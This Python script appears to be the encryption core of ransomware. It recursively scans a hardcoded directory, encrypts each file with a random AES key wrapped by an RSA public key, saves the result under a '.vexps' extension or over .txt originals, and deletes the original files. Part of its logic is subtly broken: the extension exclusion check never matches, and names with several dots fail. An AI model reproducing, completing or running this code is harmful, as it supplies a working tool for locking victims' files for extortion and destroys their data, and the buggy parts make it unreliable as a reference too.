from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import os
import base64
from pathlib import Path

'''
with open('public.pem', 'rb') as f:
	public = f.read()
	print(base64.b64encode(public))

'''

def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

def encrypt(dataFile, publicKeyFile):
        '''
        use EAX mode to allow detection of unauthorized modifications
        '''
        
        path_to_save = '/home/vaisakh/Desktop/pythawn/stuff-to-encrypt'
        fileToRead = os.path.join(path_to_save,dataFile)
        # read data from file
        with open(fileToRead, 'rb') as f:
            data = f.read()
        
        # convert data to bytes
        data = bytes(data)

        # read public key from file
        with open(publicKeyFile, 'rb') as f:
            publicKey = f.read()
        
        # create public key object
        key = RSA.import_key(publicKey)
        sessionKey = os.urandom(16)

        # encrypt the session key with the public key
        cipher = PKCS1_OAEP.new(key)
        encryptedSessionKey = cipher.encrypt(sessionKey)

        # encrypt the data with the session key
        cipher = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        []

        # save the encrypted data to file
        [ fileName, fileExtension ] = dataFile.split('.')
        
        
        if fileExtension == 'txt':
            encryptedFile = fileName + '.txt'
        else:
            encryptedFile = fileName + '.' + fileExtension + '.vexps'
        #encryptedFile = fileName + '.pdf'
        #encryptedFile = dataFile + '.vexps'
        
        
        print('file to encrypt: ' + encryptedFile)
        
        completePath = os.path.join(path_to_save,encryptedFile)
        
        
        
        with open(completePath, 'wb') as f:
            [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
        print('Encrypted file saved to ' + encryptedFile)
        
        pathName = '/home/vaisakh/Desktop/pythawn/stuff-to-encrypt/'
        pathToDelete = os.path.join(pathName,dataFile)
        if fileExtension != 'txt':
            print(f"deleted file {dataFile}")
            os.remove(pathToDelete)

        

def encryptAllFiles(): 
 
	directory = '/home/vaisakh/Desktop/pythawn/stuff-to-encrypt' # CHANGE THIS
	excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
	for item in scanRecurse(directory): 
            filePath = Path(item)
            filePath = str(filePath)
            filePath = filePath.split('/')
            #print(filePath[-1])
            requiredFile = filePath[-1].split('.')
            requiredFileName = requiredFile[0]
            fileType = requiredFile[1]

            if fileType in excludeExtension:
                continue
            encrypt(filePath[-1], "public.pem")   

